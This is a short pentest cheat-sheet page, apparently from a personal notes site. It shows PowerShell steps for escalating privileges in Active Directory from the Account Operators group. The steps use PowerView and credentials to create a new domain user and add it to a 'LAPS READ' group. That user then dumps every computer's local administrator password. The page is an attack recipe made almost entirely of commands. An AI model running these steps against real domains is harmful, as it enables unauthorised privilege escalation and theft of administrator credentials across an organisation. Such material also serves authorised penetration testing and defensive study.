---
title: "Account Operators"
date: 2024-7-23
tags: ["Credential Dumping", "AddMember", "Account Operators", "Active Directory", "Windows", "LAPS"]
---

### Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Create a new user password object

```console
$new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -Force
```

#### 4. Create a new user account

```console
New-AdUser '<NEW_USER>' -enabled $true -accountpassword $new_user_password -Credential $cred
```

#### 5. Add the new user to LAPS group

```console
Add-DomainGroupMember -Identity 'LAPS READ' -Members '<NEW_USER>' -Credential $cred
```

#### 6. Read LAPS password

```console
# Run as the new user
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
```

{{< /tabcontent >}}
